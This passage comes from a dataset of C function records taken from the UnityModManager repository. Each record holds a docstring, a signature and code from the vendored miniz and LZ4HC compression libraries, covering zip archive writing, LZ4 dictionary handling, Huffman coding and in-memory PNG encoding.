MZ_ZIP_FILE_OPEN_FAILED);\n            }\n        }\n\n        pZip->m_pWrite = mz_zip_file_write_func;\n        pZip->m_pNeeds_keepalive = NULL;\n#endif /* #ifdef MINIZ_NO_STDIO */\n    }\n    else if (pState->m_pMem)\n    {\n        /* Archive lives in a memory block. Assume it's from the heap that we can resize using the realloc callback. */\n        if (pZip->m_pIO_opaque != pZip)\n            return mz_zip_set_error(pZip, MZ_ZIP_INVALID_PARAMETER);\n\n        pState->m_mem_capacity = pState->m_mem_size;\n        pZip->m_pWrite = mz_zip_heap_write_func;\n        pZip->m_pNeeds_keepalive = NULL;\n    }\n    /* Archive is being read via a user provided read function - make sure the user has specified a write function too. */\n    else if (!pZip->m_pWrite)\n        return mz_zip_set_error(pZip, MZ_ZIP_INVALID_PARAMETER);\n\n    /* Start writing new files at the archive's current central directory location. */\n    /* TODO: We could add a flag that lets the user start writing immediately AFTER the existing central dir - this would be safer. */\n    pZip->m_archive_size = pZip->m_central_directory_file_ofs;\n    pZip->m_central_directory_file_ofs = 0;\n\n    /* Clear the sorted central dir offsets, they aren't useful or maintained now. */\n    /* Even though we're now in write mode, files can still be extracted and verified, but file locates will be slow. */\n    /* TODO: We could easily maintain the sorted central directory offsets. */\n    mz_zip_array_clear(pZip, &pZip->m_pState->m_sorted_central_dir_offsets);\n\n    pZip->m_zip_mode = MZ_ZIP_MODE_WRITING;\n\n    return MZ_TRUE;\n}", "path": "app\\src\\main\\cpp\\libuabe\\miniz\\miniz.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* dictionary saving */\n", "func_signal": "int LZ4_saveDictHC (LZ4_streamHC_t* LZ4_streamHCPtr, char* safeBuffer, int dictSize)", "code": "{\n    LZ4HC_CCtx_internal* const streamPtr = &LZ4_streamHCPtr->internal_donotuse;\n    int const prefixSize = (int)(streamPtr->end - (streamPtr->base + streamPtr->dictLimit));\n    if (dictSize > 64 KB) dictSize = 64 KB;\n    if (dictSize < 4) dictSize = 0;\n    if (dictSize > prefixSize) dictSize = prefixSize;\n    memmove(safeBuffer, streamPtr->end - dictSize, dictSize);\n    {   U32 const endIndex = (U32)(streamPtr->end - streamPtr->base);\n        streamPtr->end = (const BYTE*)safeBuffer + dictSize;\n        streamPtr->base = streamPtr->end - endIndex;\n        streamPtr->dictLimit = endIndex - dictSize;\n        streamPtr->lowLimit = endIndex - dictSize;\n        if (streamPtr->nextToUpdate < streamPtr->dictLimit) streamPtr->nextToUpdate = streamPtr->dictLimit;\n    }\n    return dictSize;\n}", "path": "app\\src\\main\\cpp\\libuabe\\lz4\\lz4hc.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* compression */\n", "func_signal": "static void LZ4HC_setExternalDict(LZ4HC_CCtx_internal* ctxPtr, const BYTE* newBlock)", "code": "{\n    if (ctxPtr->end >= ctxPtr->base + 4) LZ4HC_Insert (ctxPtr, ctxPtr->end-3);   /* Referencing remaining dictionary content */\n\n    /* Only one memory segment for extDict, so any previous extDict is lost at this stage */\n    ctxPtr->lowLimit  = ctxPtr->dictLimit;\n    ctxPtr->dictLimit = (U32)(ctxPtr->end - ctxPtr->base);\n    ctxPtr->dictBase  = ctxPtr->base;\n    ctxPtr->base = newBlock - ctxPtr->dictLimit;\n    ctxPtr->end  = newBlock;\n    ctxPtr->nextToUpdate = ctxPtr->dictLimit;   /* match referencing will resume from there */\n}", "path": "app\\src\\main\\cpp\\libuabe\\lz4\\lz4hc.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* Higher level helper functions. */\n", "func_signal": "void *tinfl_decompress_mem_to_heap(const void *pSrc_buf, size_t src_buf_len, size_t *pOut_len, int flags)", "code": "{\n    tinfl_decompressor decomp;\n    void *pBuf = NULL, *pNew_buf;\n    size_t src_buf_ofs = 0, out_buf_capacity = 0;\n    *pOut_len = 0;\n    tinfl_init(&decomp);\n    for (;;)\n    {\n        size_t src_buf_size = src_buf_len - src_buf_ofs, dst_buf_size = out_buf_capacity - *pOut_len, new_out_buf_capacity;\n        tinfl_status status = tinfl_decompress(&decomp, (const mz_uint8 *)pSrc_buf + src_buf_ofs, &src_buf_size, (mz_uint8 *)pBuf, pBuf ? (mz_uint8 *)pBuf + *pOut_len : NULL, &dst_buf_size,\n                                               (flags & ~TINFL_FLAG_HAS_MORE_INPUT) | TINFL_FLAG_USING_NON_WRAPPING_OUTPUT_BUF);\n        if ((status < 0) || (status == TINFL_STATUS_NEEDS_MORE_INPUT))\n        {\n            MZ_FREE(pBuf);\n            *pOut_len = 0;\n            return NULL;\n        }\n        src_buf_ofs += src_buf_size;\n        *pOut_len += dst_buf_size;\n        if (status == TINFL_STATUS_DONE)\n            break;\n        new_out_buf_capacity = out_buf_capacity * 2;\n        if (new_out_buf_capacity < 128)\n            new_out_buf_capacity = 128;\n        pNew_buf = MZ_REALLOC(pBuf, new_out_buf_capacity);\n        if (!pNew_buf)\n        {\n            MZ_FREE(pBuf);\n            *pOut_len = 0;\n            return NULL;\n        }\n        pBuf = pNew_buf;\n        out_buf_capacity = new_out_buf_capacity;\n    }\n    return pBuf;\n}", "path": "app\\src\\main\\cpp\\libuabe\\miniz\\miniz.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* initialization */\n", "func_signal": "void LZ4_resetStreamHC (LZ4_streamHC_t* LZ4_streamHCPtr, int compressionLevel)", "code": "{\n    LZ4_STATIC_ASSERT(sizeof(LZ4HC_CCtx_internal) <= sizeof(size_t) * LZ4_STREAMHCSIZE_SIZET);   /* if compilation fails here, LZ4_STREAMHCSIZE must be increased */\n    LZ4_streamHCPtr->internal_donotuse.base = NULL;\n    LZ4_setCompressionLevel(LZ4_streamHCPtr, compressionLevel);\n}", "path": "app\\src\\main\\cpp\\libuabe\\lz4\\lz4hc.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* MINIZ_USE_UNALIGNED_LOADS_AND_STORES && MINIZ_LITTLE_ENDIAN && MINIZ_HAS_64BIT_REGISTERS */\n", "func_signal": "static mz_bool tdefl_compress_block(tdefl_compressor *d, mz_bool static_block)", "code": "{\n    if (static_block)\n        tdefl_start_static_block(d);\n    else\n        tdefl_start_dynamic_block(d);\n    return tdefl_compress_lz_codes(d);\n}", "path": "app\\src\\main\\cpp\\libuabe\\miniz\\miniz.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* requires mlen >= MINMATCH */\n", "func_signal": "LZ4_FORCE_INLINE int LZ4HC_sequencePrice(int litlen, int mlen)", "code": "{\n    int price = 1 + 2 ; /* token + 16-bit offset */\n\n    price += LZ4HC_literalsPrice(litlen);\n\n    if (mlen >= (int)(ML_MASK+MINMATCH))\n        price += 1 + (mlen-(ML_MASK+MINMATCH))/255;\n\n    return price;\n}", "path": "app\\src\\main\\cpp\\libuabe\\lz4\\lz4hc.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* #ifndef MINIZ_NO_STDIO */\n", "func_signal": "static size_t mz_zip_compute_crc32_callback(void *pOpaque, mz_uint64 file_ofs, const void *pBuf, size_t n)", "code": "{\n    mz_uint32 *p = (mz_uint32 *)pOpaque;\n    (void)file_ofs;\n    *p = (mz_uint32)mz_crc32(*p, (const mz_uint8 *)pBuf, n);\n    return n;\n}", "path": "app\\src\\main\\cpp\\libuabe\\miniz\\miniz.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* tdefl_calculate_minimum_redundancy() originally written by: Alistair Moffat, alistair@cs.mu.oz.au, Jyrki Katajainen, jyrki@diku.dk, November 1996. */\n", "func_signal": "static void tdefl_calculate_minimum_redundancy(tdefl_sym_freq *A, int n)", "code": "{\n    int root, leaf, next, avbl, used, dpth;\n    if (n == 0)\n        return;\n    else if (n == 1)\n    {\n        A[0].m_key = 1;\n        return;\n    }\n    A[0].m_key += A[1].m_key;\n    root = 0;\n    leaf = 2;\n    for (next = 1; next < n - 1; next++)\n    {\n        if (leaf >= n || A[root].m_key < A[leaf].m_key)\n        {\n            A[next].m_key = A[root].m_key;\n            A[root++].m_key = (mz_uint16)next;\n        }\n        else\n            A[next].m_key = A[leaf++].m_key;\n        if (leaf >= n || (root < next && A[root].m_key < A[leaf].m_key))\n        {\n            A[next].m_key = (mz_uint16)(A[next].m_key + A[root].m_key);\n            A[root++].m_key = (mz_uint16)next;\n        }\n        else\n            A[next].m_key = (mz_uint16)(A[next].m_key + A[leaf++].m_key);\n    }\n    A[n - 2].m_key = 0;\n    for (next = n - 3; next >= 0; next--)\n        A[next].m_key = A[A[next].m_key].m_key + 1;\n    avbl = 1;\n    used = dpth = 0;\n    root = n - 2;\n    next = n - 1;\n    while (avbl > 0)\n    {\n        while (root >= 0 && (int)A[root].m_key == dpth)\n        {\n            used++;\n            root--;\n        }\n        while (avbl > used)\n        {\n            A[next--].m_key = (mz_uint16)(dpth);\n            avbl--;\n        }\n        avbl = 2 * used;\n        dpth++;\n        used = 0;\n    }\n}", "path": "app\\src\\main\\cpp\\libuabe\\miniz\\miniz.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* price in bytes */\n", "func_signal": "LZ4_FORCE_INLINE int LZ4HC_literalsPrice(int const litlen)", "code": "{\n    int price = litlen;\n    if (litlen >= (int)RUN_MASK)\n        price += 1 + (litlen-RUN_MASK)/255;\n    return price;\n}", "path": "app\\src\\main\\cpp\\libuabe\\lz4\\lz4hc.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* LZ4HC_encodeSequence() :\n * @return : 0 if ok,\n *           1 if buffer issue detected */\n", "func_signal": "LZ4_FORCE_INLINE int LZ4HC_encodeSequence (\n    const BYTE** ip,\n    BYTE** op,\n    const BYTE** anchor,\n    int matchLength,\n    const BYTE* const match,\n    limitedOutput_directive limit,\n    BYTE* oend)", "code": "{\n    size_t length;\n    BYTE* const token = (*op)++;\n\n#if defined(LZ4_DEBUG) && (LZ4_DEBUG >= 6)\n    static const BYTE* start = NULL;\n    static U32 totalCost = 0;\n    U32 const pos = (start==NULL) ? 0 : (U32)(*anchor - start);\n    U32 const ll = (U32)(*ip - *anchor);\n    U32 const llAdd = (ll>=15) ? ((ll-15) / 255) + 1 : 0;\n    U32 const mlAdd = (matchLength>=19) ? ((matchLength-19) / 255) + 1 : 0;\n    U32 const cost = 1 + llAdd + ll + 2 + mlAdd;\n    if (start==NULL) start = *anchor;  /* only works for single segment */\n    //g_debuglog_enable = (pos >= 2228) & (pos <= 2262);\n    DEBUGLOG(6, \"pos:%7u -- literals:%3u, match:%4i, offset:%5u, cost:%3u + %u\",\n                pos,\n                (U32)(*ip - *anchor), matchLength, (U32)(*ip-match),\n                cost, totalCost);\n    totalCost += cost;\n#endif\n\n    /* Encode Literal length */\n    length = (size_t)(*ip - *anchor);\n    if ((limit) && ((*op + (length >> 8) + length + (2 + 1 + LASTLITERALS)) > oend)) return 1;   /* Check output limit */\n    if (length >= RUN_MASK) {\n        size_t len = length - RUN_MASK;\n        *token = (RUN_MASK << ML_BITS);\n        for(; len >= 255 ; len -= 255) *(*op)++ = 255;\n        *(*op)++ = (BYTE)len;\n    } else {\n        *token = (BYTE)(length << ML_BITS);\n    }\n\n    /* Copy Literals */\n    LZ4_wildCopy(*op, *anchor, (*op) + length);\n    *op += length;\n\n    /* Encode Offset */\n    LZ4_writeLE16(*op, (U16)(*ip-match)); *op += 2;\n\n    /* Encode MatchLength */\n    assert(matchLength >= MINMATCH);\n    length = (size_t)(matchLength - MINMATCH);\n    if ((limit) && (*op + (length >> 8) + (1 + LASTLITERALS) > oend)) return 1;   /* Check output limit */\n    if (length >= ML_MASK) {\n        *token += ML_MASK;\n        length -= ML_MASK;\n        for(; length >= 510 ; length -= 510) { *(*op)++ = 255; *(*op)++ = 255; }\n        if (length >= 255) { length -= 255; *(*op)++ = 255; }\n        *(*op)++ = (BYTE)length;\n    } else {\n        *token += (BYTE)(length);\n    }\n\n    /* Prepare next loop */\n    *ip += matchLength;\n    *anchor = *ip;\n\n    return 0;\n}", "path": "app\\src\\main\\cpp\\libuabe\\lz4\\lz4hc.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* Simple PNG writer function by Alex Evans, 2011. Released into the public domain: https://gist.github.com/908299, more context at\n http://altdevblogaday.org/2011/04/06/a-smaller-jpg-encoder/.\n This is actually a modification of Alex's original code so PNG files generated by this function pass pngcheck. */\n", "func_signal": "void *tdefl_write_image_to_png_file_in_memory_ex(const void *pImage, int w, int h, int num_chans, size_t *pLen_out, mz_uint level, mz_bool flip)", "code": "{\n    /* Using a local copy of this array here in case MINIZ_NO_ZLIB_APIS was defined. */\n    static const mz_uint s_tdefl_png_num_probes[11] = { 0, 1, 6, 32, 16, 32, 128, 256, 512, 768, 1500 };\n    tdefl_compressor *pComp = (tdefl_compressor *)MZ_MALLOC(sizeof(tdefl_compressor));\n    tdefl_output_buffer out_buf;\n    int i, bpl = w * num_chans, y, z;\n    mz_uint32 c;\n    *pLen_out = 0;\n    if (!pComp)\n        return NULL;\n    MZ_CLEAR_OBJ(out_buf);\n    out_buf.m_expandable = MZ_TRUE;\n    out_buf.m_capacity = 57 + MZ_MAX(64, (1 + bpl) * h);\n    if (NULL == (out_buf.m_pBuf = (mz_uint8 *)MZ_MALLOC(out_buf.m_capacity)))\n    {\n        MZ_FREE(pComp);\n        return NULL;\n    }\n    /* write dummy header */\n    for (z = 41; z; --z)\n        tdefl_output_buffer_putter(&z, 1, &out_buf);\n    /* compress image data */\n    tdefl_init(pComp, tdefl_output_buffer_putter, &out_buf, s_tdefl_png_num_probes[MZ_MIN(10, level)] | TDEFL_WRITE_ZLIB_HEADER);\n    for (y = 0; y < h; ++y)\n    {\n        tdefl_compress_buffer(pComp, &z, 1, TDEFL_NO_FLUSH);\n        tdefl_compress_buffer(pComp, (mz_uint8 *)pImage + (flip ? (h - 1 - y) : y) * bpl, bpl, TDEFL_NO_FLUSH);\n    }\n    if (tdefl_compress_buffer(pComp, NULL, 0, TDEFL_FINISH) != TDEFL_STATUS_DONE)\n    {\n        MZ_FREE(pComp);\n        MZ_FREE(out_buf.m_pBuf);\n        return NULL;\n    }\n    /* write real header */\n    *pLen_out = out_buf.m_size - 41;\n    {\n        static const mz_uint8 chans[] = { 0x00, 0x00, 0x04, 0x02, 0x06 };\n        mz_uint8 pnghdr[41] = { 0x89, 0x50, 0x4e, 0x47, 0x0d,\n                                0x0a, 0x1a, 0x0a, 0x00, 0x00,\n                                0x00, 0x0d, 0x49, 0x48, 0x44,\n                                0x52, 0x00, 0x00, 0x00, 0x00,\n                                0x00, 0x00, 0x00, 0x00, 0x08,\n                                0x00, 0x00, 0x00, 0x00, 0x00,\n                                0x00, 0x00, 0x00, 0x00, 0x00,\n                                0x00, 0x00, 0x49, 0x44, 0x41,\n                                0x54 };\n        pnghdr[18] = (mz_uint8)(w >> 8);\n        pnghdr[19] = (mz_uint8)w;\n        pnghdr[22] = (mz_uint8)(h >> 8);\n        pnghdr[23] = (mz_uint8)h;\n        pnghdr[25] = chans[num_chans];\n        pnghdr[33] = (mz_uint8)(*pLen_out >> 24);\n        pnghdr[34] = (mz_uint8)(*pLen_out >> 16);\n        pnghdr[35] = (mz_uint8)(*pLen_out >> 8);\n        pnghdr[36] = (mz_uint8)*pLen_out;\n        c = (mz_uint32)mz_crc32(MZ_CRC32_INIT, pnghdr + 12, 17);\n        for (i = 0; i < 4; ++i, c <<= 8)\n            ((mz_uint8 *)(pnghdr + 29))[i] = (mz_uint8)(c >> 24);\n        memcpy(out_buf.m_pBuf, pnghdr, 41);\n    }\n    /* write footer (IDAT CRC-32, followed by IEND chunk) */\n    if (!tdefl_output_buffer_putter(\"\\0\\0\\0\\0\\0\\0\\0\\0\\x49\\x45\\x4e\\x44\\xae\\x42\\x60\\x82\", 16, &out_buf))\n    {\n        *pLen_out = 0;\n        MZ_FREE(pComp);\n        MZ_FREE(out_buf.m_pBuf);\n        return NULL;\n    }\n    c = (mz_uint32)mz_crc32(MZ_CRC32_INIT, out_buf.m_pBuf + 41 - 4, *pLen_out + 4);\n    for (i = 0; i < 4; ++i, c <<= 8)\n        (out_buf.m_pBuf + out_buf.m_size - 16)[i] = (mz_uint8)(c >> 24);\n    /* compute final size of file, grab compressed data buffer and return */\n    *pLen_out += 57;\n    MZ_FREE(pComp);\n    return out_buf.m_pBuf;\n}", "path": "app\\src\\main\\cpp\\libuabe\\miniz\\miniz.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* MINIZ_USE_UNALIGNED_LOADS_AND_STORES && MINIZ_LITTLE_ENDIAN */\n", "func_signal": "static MZ_FORCEINLINE void tdefl_record_literal(tdefl_compressor *d, mz_uint8 lit)", "code": "{\n    d->m_total_lz_bytes++;\n    *d->m_pLZ_code_buf++ = lit;\n    *d->m_pLZ_flags = (mz_uint8)(*d->m_pLZ_flags >> 1);\n    if (--d->m_num_flags_left == 0)\n    {\n        d->m_num_flags_left = 8;\n        d->m_pLZ_flags = d->m_pLZ_code_buf++;\n    }\n    d->m_huff_count[0][lit]++;\n}", "path": "app\\src\\main\\cpp\\libuabe\\miniz\\miniz.c", "repo_name": "xausky/UnityModManager", "stars": 322, "license": "gpl-3.0", "language": "c", "size": 6669}
{"docstring": "/* TODO: This func is now pretty freakin complex due to zip64, split it up? */\n", "func_signal": "mz_bool mz_zip_writer_add_from_zip_reader(mz_zip_archive *pZip, mz_zip_archive *pSource_zip, mz_uint src_file_index)", "code": "{\n    mz_uint n, bit_flags, num_alignment_padding_bytes, src_central_dir_following_data_size;\n    mz_uint64 src_archive_bytes_remaining, local_dir_header_ofs;\n    mz_uint64 cur_src_file_ofs, cur_dst_file_ofs;\n    mz_uint32 local_header_u32[(MZ_ZIP_LOCAL_DIR_HEADER_SIZE + sizeof(mz_uint32) - 1) / sizeof(mz_uint32)];\n    mz_uint8 *pLocal_header = (mz_uint8 *)local_header_u32;\n    mz_uint8 new_central_header[MZ_ZIP_CENTRAL_DIR_HEADER_SIZE];\n    size_t orig_central_dir_size;\n    mz_zip_internal_state *pState;\n    void *pBuf;\n    const mz_uint8 *pSrc_central_header;\n    mz_zip_archive_file_stat src_file_stat;\n    mz_uint32 src_filename_len, src_comment_len, src_ext_len;\n    mz_uint32 local_header_filename_size, local_header_extra_len;\n    mz_uint64 local_header_comp_size, local_header_uncomp_size;\n    mz_bool found_zip64_ext_data_in_ldir = MZ_FALSE;\n\n    /* Sanity checks */\n    if ((!pZip) || (!pZip->m_pState) || (pZip->m_zip_mode != MZ_ZIP_MODE_WRITING) || (!pSource_zip->m_pRead))\n        return mz_zip_set_error(pZip, MZ_ZIP_INVALID_PARAMETER);\n\n    pState = pZip->m_pState;\n\n    /* Don't support copying files from zip64 archives to non-zip64, even though in some cases this is possible */\n    if ((pSource_zip->m_pState->m_zip64) && (!pZip->m_pState->m_zip64))\n        return mz_zip_set_error(pZip, MZ_ZIP_INVALID_PARAMETER);\n\n    /* Get pointer to the source central dir header and crack it */\n    if (NULL == (pSrc_central_header = mz_zip_get_cdh(pSource_zip, src_file_index)))\n        return mz_zip_set_error(pZip, MZ_ZIP_INVALID_PARAMETER);\n\n    if (MZ_READ_LE32(pSrc_central_header + MZ_ZIP_CDH_SIG_OFS) != MZ_ZIP_CENTRAL_DIR_HEADER_SIG)\n        return mz_zip_set_error(pZip, MZ_ZIP_INVALID_HEADER_OR_CORRUPTED);\n\n    src_filename_len = MZ_READ_LE16(pSrc_central_header + MZ_ZIP_CDH_FILENAME_LEN_OFS);\n    src_comment_len = MZ_READ_LE16(pSrc_central_header + MZ_ZIP_CDH_COMMENT_LEN_OFS);\n    src_ext_len = MZ_READ_LE16(pSrc_central_header + MZ_ZIP_CDH_EXTRA_LEN_OFS);\n    src_central_dir_following_data_size = src_filename_len + src_ext_len + src_comment_len;\n\n    /* TODO: We don't support central dir's >= MZ_UINT32_MAX bytes right now (+32 fudge factor in case we need to add more extra data) */\n    if ((pState->m_central_dir.m_size + MZ_ZIP_CENTRAL_DIR_HEADER_SIZE + src_central_dir_following_data_size + 32) >= MZ_UINT32_MAX)\n        return mz_zip_set_error(pZip, MZ_ZIP_UNSUPPORTED_CDIR_SIZE);\n\n    num_alignment_padding_bytes = mz_zip_writer_compute_padding_needed_for_file_alignment(pZip);\n\n    if (!pState->m_zip64)\n    {\n        if (pZip->m_total_files == MZ_UINT16_MAX)\n            return mz_zip_set_error(pZip, MZ_ZIP_TOO_MANY_FILES);\n    }\n    else\n    {\n        /* TODO: Our zip64 support still has some 32-bit limits that may not be worth fixing. */\n        if (pZip->m_total_files == MZ_UINT32_MAX)\n            return mz_zip_set_error(pZip, MZ_ZIP_TOO_MANY_FILES);\n    }\n\n    if (!mz_zip_file_stat_internal(pSource_zip, src_file_index, pSrc_central_header, &src_file_stat, NULL))\n        return MZ_FALSE;\n\n    cur_src_file_ofs = src_file_stat.m_local_header_ofs;\n    cur_dst_file_ofs = pZip->m_archive_size;\n\n    /* Read the source archive's local dir header */\n    if (pSource_zip->m_pRead(pSource_zip->m_pIO_opaque, cur_src_file_ofs, pLocal_header, MZ_ZIP_LOCAL_DIR_HEADER_SIZE) != MZ_ZIP_LOCAL_DIR_HEADER_SIZE)\n        return mz_zip_set_error(pZip, MZ_ZIP_FILE_READ_FAILED);\n\n    if (MZ_READ_LE32(pLocal_header) != MZ_ZIP_LOCAL_DIR_HEADER_SIG)\n        return mz_zip_set_error(pZip, MZ_ZIP_INVALID_HEADER_OR_CORRUPTED);\n\n    cur_src_file_ofs += MZ_ZIP_LOCAL_DIR_HEADER_SIZE;\n\n    /* Compute the total size we need to copy (filename+extra data+compressed data) */\n    local_header_filename_size = MZ_READ_LE16(pLocal_header + MZ_ZIP_LDH_FILENAME_LEN_OFS);\n    local_header_extra_len = MZ_READ_LE16(pLocal_header + MZ_ZIP_LDH_EXTRA_LEN_OFS);\n    local_header_comp_size = MZ_READ_LE32(pLocal_header + MZ_ZIP_LDH_COMPRESSED_SIZE_OFS);\n    local_header_uncomp_size = MZ_READ_LE32(pLocal_header + MZ_ZIP_LDH_DECOMPRESSED_SIZE_OFS);\n    src_archive_bytes_remaining = local_header_filename_size + local_header_extra_len + src_file_stat.m_comp_size;\n\n    /* Try to find a zip64 extended information field */\n    if ((local_header_extra_len) && ((local_header_comp_size == MZ_UINT32_MAX) || (local_header_uncomp_size == MZ_UINT32_MAX)))\n    {\n        mz_zip_array file_data_array;\n        const mz_uint8 *pExtra_data;\n        mz_uint32 extra_size_remaining = local_header_extra_len;\n\n        mz_zip_array_init(&file_data_array, 1);\n        if (!mz_zip_array_resize(pZip, &file_data_array, local_header_extra_len, MZ_FALSE))\n        {\n            return mz_zip_set_error(pZip, MZ_ZIP_ALLOC_FAILED);\n        }\n\n        if (pSource_zip->m_pRead(pSource_zip->m_pIO_opaque, src_file_stat.m_local_header_ofs + MZ_ZIP_LOCAL_DIR_HEADER_SIZE + local_header_filename_size, file_data_array.m_p, local_header_extra_len) != local_header_extra_len)\n        {\n            mz_zip_array_clear(pZip, &file_data_array);\n            return mz_zip_set_error(pZip, MZ_ZIP_FILE_READ_FAILED);\n        }\n\n        pExtra_data = (const mz_uint8 *)file_data_array.m_p;\n\n        do\n        {\n            mz_uint32 field_id, field_data_size, field_total_size;\n\n            if (extra_size_remaining < (sizeof(mz_uint16) * 2))\n            {\n                mz_zip_array_clear(pZip, &file_data_array);\n                return mz_zip_set_error(pZip, MZ_ZIP_INVALID_HEADER_OR_CORRUPTED);\n            }\n\n            field_id = MZ_READ_LE16(pExtra_data);\n            field_data_size = MZ_READ_LE16(pExtra_data + sizeof(mz_uint16));\n            field_total_size = field_data_size + sizeof(mz_uint16) * 2;\n\n            if (field_total_size > extra_size_remaining)\n            {\n                mz_zip_array_clear(pZip, &file_data_array);\n                return mz_zip_set_error(pZip, MZ_ZIP_INVALID_HEADER_OR_CORRUPTED);\n            }\n\n            if (field_id == MZ_ZIP64_EXTENDED_INFORMATION_FIELD_HEADER_ID)\n            {\n                const mz_uint8 *pSrc_field_data = pExtra_data + sizeof(mz_uint32);\n\n                if (field_data_size < sizeof(mz_uint64) * 2)\n                {\n                    mz_zip_array_clear(pZip, &file_data_array);\n                    return mz_zip_set_error(pZip, MZ_ZIP_INVALID_HEADER_OR_CORRUPTED);\n                }\n\n                local_header_uncomp_size = MZ_READ_LE64(pSrc_field_data);\n                local_header_comp_size = MZ_READ_LE64(pSrc_field_data + sizeof(mz_uint64)); /* may be 0 if there's a descriptor */\n\n                found_zip64_ext_data_in_ldir = MZ_TRUE;\n                break;\n            }\n\n            pExtra_data += field_total_size;\n            extra_size_remaining -= field_total_size;\n        } while (extra_size_remaining);\n\n        mz_zip_array_clear(pZip, &file_data_array);\n    }\n\n    if (!pState->m_zip64)\n    {\n        /* Try to detect if the new archive will most likely wind up too big and bail early (+(sizeof(mz_uint32) * 4) is for the optional descriptor which could be present, +64 is a fudge factor). */\n        /* We also check when the archive is finalized so this doesn't need to be perfect. */\n        mz_uint64 approx_new_archive_size = cur_dst_file_ofs + num_alignment_padding_bytes + MZ_ZIP_LOCAL_DIR_HEADER_SIZE + src_archive_bytes_remaining + (sizeof(mz_uint32) * 4) +\n                                            pState->m_central_dir.m_size + MZ_ZIP_CENTRAL_DIR_HEADER_SIZE + src_central_dir_following_data_size + MZ_ZIP_END_OF_CENTRAL_DIR_HEADER_SIZE + 64;\n\n        if (approx_new_archive_size >= MZ_UINT32_MAX)\n            return mz_zip_set_error(pZip, MZ_ZIP_ARCHIVE_TOO_LARGE);\n    }\n\n    /* Write dest archive padding */\n    if (!mz_zip_writer_write_zeros(pZip, cur_dst_file_ofs, num_alignment_padding_bytes))\n        return MZ_FALSE;\n\n    cur_dst_file_ofs += num_alignment_padding_bytes;\n\n    local_dir_header_ofs = cur_dst_file_ofs;\n    if (pZip->m_file_offset_alignment)\n    {\n        MZ_ASSERT((local_dir_header_ofs & (pZip->m_file_offset_alignment - 1)) == 0);\n    }\n\n    /* The original zip's local header+ext block doesn't change, even with zip64, so we can just copy it over to the dest zip */\n    if (pZip->m_pWrite(pZip->m_pIO_opaque, cur_dst_file_ofs, pLocal_header, MZ_ZIP_LOCAL_DIR_HEADER_SIZE) != MZ_ZIP_LOCAL_DIR_HEADER_SIZE)\n        return mz_zip_set_error(pZip, MZ_ZIP_FILE_WRITE_FAILED);\n\n    cur_dst_file_ofs += MZ_ZIP_LOCAL_DIR_HEADER_SIZE;\n\n    /* Copy over the source archive bytes to the dest archive, also ensure we have enough buf space to handle optional data descriptor */\n    if (NULL == (pBuf = pZip->m_pAlloc(pZip->m_pAlloc_opaque, 1, (size_t)MZ_MAX(32U, MZ_MIN((mz_uint64)MZ_ZIP_MAX_IO_BUF_SIZE, src_archive_bytes_remaining)))))\n        return mz_zip_set_error(pZip, MZ_ZIP_ALLOC_FAILED);\n\n    while (src_archive_bytes_remaining)\n    {\n        n = (mz_uint)MZ_MIN((mz_uint64)MZ_ZIP_MAX_IO_BUF_SIZE, src_archive_bytes_remaining);\n        if (pSource_zip->m_pRead(pSource_zip->m_pIO_opaque, cur_src_file_ofs, pBuf, n) != n)\n        {\n            pZip->m_pFree(pZip->m_pAlloc_opaque, pBuf);\n            return mz_zip_set_error(pZip, MZ_ZIP_FILE_READ_FAILED);\n        }\n        cur_src_file_ofs += n;\n\n        if (pZip->m_pWrite(pZip->m_pIO_opaque, cur_dst_file_ofs, pBuf, n) != n)\n        {\n            pZip->m_pFree(pZip->m_pAlloc_opaque, pBuf);\n            return mz_zip_set_error(pZip, MZ_ZIP_FILE_WRITE_FAILED);\n        }\n        cur_dst_file_ofs += n;\n\n        src_archive_bytes_remaining -= n;\n    }\n\n    /* Now deal with the optional data descriptor */\n    bit_flags = MZ_READ_LE16(pLocal_header + MZ_ZIP_LDH_BIT_FLAG_OFS);\n    if (bit_flags & 8)\n    {\n        /* Copy data descriptor */\n        if ((pSource_zip->m_pState->m_zip64) || (found_zip64_ext_data_in_ldir))\n        {\n            /* src is zip64, dest must be zip64 */\n\n            /* name\t\t\tuint32_t's */\n            /* id\t\t\t\t1 (optional in zip64?) */\n            /* crc\t\t\t1 */\n            /* comp_size\t2 */\n            /* uncomp_size 2 */\n            if (pSource_zip->m_pRead(pSource_zip->m_pIO_opaque, cur_src_file_ofs, pBuf, (sizeof(mz_uint32) * 6)) != (sizeof(mz_uint32) * 6))\n            {\n                pZip->m_pFree(pZip->m_pAlloc_opaque, pBuf);\n                return mz_zip_set_error(pZip, MZ_ZIP_FILE_READ_FAILED);\n            }\n\n            n = sizeof(mz_uint32) * ((MZ_READ_LE32(pBuf) == MZ_ZIP_DATA_DESCRIPTOR_ID) ? 6 : 5);\n        }\n        else\n        {\n            /* src is NOT zip64 */\n            mz_bool has_id;\n\n            if (pSource_zip->m_pRead(pSource_zip->m_pIO_opaque, cur_src_file_ofs, pBuf, sizeof(mz_uint32) * 4) != sizeof(mz_uint32) * 4)\n            {\n                pZip->m_pFree(pZip->m_pAlloc_opaque, pBuf);\n                return mz_zip_set_error(pZip, MZ_ZIP_FILE_READ_FAILED);\n            }\n\n            has_id = 